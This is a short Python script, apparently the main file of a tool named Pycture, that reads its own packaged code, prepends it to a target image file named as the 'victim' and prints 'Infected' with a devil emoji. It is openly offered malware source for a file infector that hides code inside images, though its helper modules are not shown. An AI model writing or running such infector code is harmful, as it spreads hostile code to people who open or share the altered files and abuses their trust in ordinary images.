#!/usr/bin/env python3
"""
Pycture main code
"""

from pathlib import Path

from utils.parse_argv import parse_argv
from utils.code_pkg import packaged_code
from utils.image_io import Image_IO


def pycture() -> None:
    """
    Main function
    """
    args = parse_argv()
    img_io = Image_IO(args.victim_path)
    code_bytes = packaged_code(Path(__file__).parent)
    img_bytes = img_io.read()
    img_io.write(code_bytes + img_bytes)
    print(f"Infected {args.victim_path} 😈")


if __name__ == "__main__":
    pycture()